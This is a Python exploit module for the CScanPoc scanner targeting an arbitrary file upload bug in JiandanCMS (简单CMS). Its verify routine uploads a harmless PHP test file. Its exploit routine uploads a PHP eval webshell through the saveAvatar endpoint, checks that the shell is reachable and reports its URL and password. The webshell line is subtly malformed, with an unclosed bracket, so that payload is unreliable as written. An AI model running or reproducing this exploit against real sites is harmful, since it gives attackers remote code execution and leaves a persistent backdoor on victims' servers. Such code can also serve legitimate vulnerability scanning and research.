# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'JiandanCMS_0001_p'  # 平台漏洞编号，留空
    name = '简单CMS Getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-10-30'  # 漏洞公布时间
    desc = '''
        简单CMS 可上传任意文件导致getshell.
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/859/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'JiandanCMS(简单CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '59a38229-515b-4bea-8a1a-c7adec08b17b'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 根据实际环境payload可能不同
            s = requests.session()
            payload = '/jd/index.php'
            parms = '?a=saveAvatar&m=Uc&g=Home&id=1&photoServer=c.php&type=ig'
            data = "<?php echo md5(c)?>"
            s.get(self.target + payload)
            url = self.target + payload + parms
            r = s.post(url, data=data)

            if 'c.php' in r.text and '"status":1' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 根据实际环境payload可能不同
            s = requests.session()
            payload = '/jd/index.php'
            parms = '?a=saveAvatar&m=Uc&g=Home&id=1&photoServer=c.php&type=ig'
            data = "<?php echo md5(c);@eval($_POST[c);?>"
            s.get(self.target + payload)
            url = self.target + payload + parms
            r = s.post(url, data=data)
            verify_url = self.target + '/jd/Uploads/avatar_big/c.php'
            r1 = s.get(verify_url)

            if 'c.php' in r.text and '"status":1' in r.text and '4a8a08f09d37b73795649038408b5f33' in r1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞 ，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
